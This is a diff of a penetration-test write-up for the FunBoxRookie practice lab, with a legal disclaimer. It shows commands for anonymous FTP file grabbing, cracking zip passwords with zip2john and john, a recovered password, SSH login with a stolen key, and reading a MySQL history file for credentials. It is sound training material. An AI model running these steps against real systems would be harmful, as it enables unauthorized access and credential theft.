@@ -1,8 +1,8 @@
 # Penetration Test Report for Proving Grounds - FunBoxRookie
-**Author:** Joey Melo
-**Date:** March 18, 2022
-**Client:** Proving Grounds
-**Host:** 192.168.189.107 (FunBoxRookie)
+- **Author:** Joey Melo
+- **Date:** March 18, 2022
+- **Client:** Proving Grounds
+- **Host:** 192.168.99.107 (FunBoxRookie)
 
 ## Disclaimer
 The following report is the solution of a challenge in a learning platform that has no association whatsoever with the author. Please consider this report as a rough simulation of what a real pentesting report looks like. Attempting to use the methodologies demonstrated in this report in unauthorized clients is ILLEGAL. The author is not responsible for improper use or unauthorized modifications of this information. The author assumes no liability for the use of information disclosed in this report. Any damage or loss that may result from improper use of the information contained in this report is the sole responsibility of the user and not the author. The author recommends safe practices and an ethical standpoint when working with clients and or with tools demonstrated in this report.
@@ -27,7 +27,7 @@ The tester recommends patching the vulnerabilities identified during the testing
 ### FTP Enumeration
 Upon manual enumeration of the available FTP service, the tester noticed it had anonymous access enabled which allowed the tester to read all files in the FTP folder.
 The content comprised of multiple password-protected zip files and an encoded message from admin informing that these files contain ssh keys.
-<ss1>
+![](https://imgur.com/a/XgtC3eB)
 
 ## Initial Access
 ### Vulnerability Explanation
@@ -37,7 +37,7 @@ Disable anonymous access to the FTP server and enforce a stronger password polic
 ### Attack Walkthrough
 Initial access was obtained to the FTP server with anonymous credentials and all files were transfer to the tester's machine.
 ```bash
-ftp anonymous@192.168.189.107
+ftp anonymous@192.168.99.107
 ftp> ls -la
 ftp> mget *
 ftp> get .@admins
@@ -50,12 +50,12 @@ cat .@admins | base64 -d
 ```
 <ss2>
 
-Then, using a simple wordlist, two passwords were cracked, which granted access to the SSH server. The tester decided to connect to the *tom* user.
+Then, using a simple wordlist, two passwords were cracked. The zip files were extracted and they contained an access key to the SSH server. The tester decided to connect to the *tom* user.
 ```bash
-for f in `ls .zip`; do zip2john $f >> hashes.txt; done
+for f in `ls *.zip`; do zip2john $f >> hashes.txt; done
 john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
 unzip tom.zip # pwd=iubire
-ssh -i id_rsa tom@192.168.189.107 
+ssh -i id_rsa tom@192.168.99.107 
 ```
 <ss3>
 
@@ -73,6 +73,7 @@ A simple user and directory enumeration revealed that *tom* is a member of the *
 ```bash
 id
 ls -la
+cat .mysql_history
 ```
 <ss4>
 
@@ -100,7 +101,7 @@ ftp> exit
 cat .@admins | base64 -d
 
 # Crack zip files
-for f in `ls .zip`; do zip2john $f >> hashes.txt; done
+for f in `ls *.zip`; do zip2john $f >> hashes.txt; done
 john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
 unzip tom.zip # pwd=iubire
 
